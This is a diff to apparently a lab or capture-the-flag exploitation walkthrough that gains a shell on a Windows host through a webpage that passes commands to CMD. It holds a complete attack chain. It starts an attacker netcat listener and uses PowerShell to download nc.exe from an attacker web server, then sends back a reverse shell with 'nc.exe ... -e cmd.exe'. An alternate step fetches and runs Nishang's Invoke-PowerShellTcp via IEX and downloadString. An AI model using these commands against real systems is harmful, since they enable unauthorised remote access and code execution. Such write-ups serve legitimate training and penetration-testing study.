@@ -3,17 +3,29 @@
     (10.10.10.2:8000/nc.exe will be used as an example)
         python -m SimpleHTTPServer in directory holding nc.exe
 
-2. From the SysCallSubmit webpage we will need to submit a series of commands
+2 Set up nc listener on attack machine
+    nc -lnvp 4444
+
+3. From the SysCallSubmit webpage we will need to submit a series of commands
    that:
    (SysCall submit will send commands to CMD. use 
    'powershell -command "POWERSHELLCOMMANDHERE"' to execute powershell commands)
    a) Download nc from webserver (nc.zip is the downloaded file)
         powershell -command "Invoke-WebRequest -UseBasicParsing 
-        -OutFile C:\Users\uncle\nc.exe http://10.10.10.2:8000/nc.exe"
-   d) Launch shell (this command launches a shell specifically on 3001)
-        powershell -command "C:\Users\uncle\nc.exe -Lp 3001 -e cmd.exe"
+        -OutFile .\nc.exe http://10.10.10.2:8000/nc.exe"
+   d) Send reverse shell to attacker(this command launches a shell 
+        specifically on 3001)
+        .\nc.exe 10.10.10.2 4444 -e cmd.exe"
 
-3. On attack machine, establish tcp connection with corresponding port
-        nc 10.10.10.1 3001
+3(alt). You can also do this without netcat. down load this:
+        https://github.com/samratashok/nishang/blob/master/Shells/Invoke-
+        PowerShellTcp.ps1
+    paste this line at the bottom of the file with your attack ip:
+        Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 
+        -Port 4444
+
+    Download and execute the file with one command:
+        powershell "IEX(New-Object Net.WebClient).downlaodString('http://10.
+        10.10.2:8000/Invoke-PowerShellTcp.ps1')"
 
 YOU NOW HAVE UNPRIVILEGED ACCESS :)
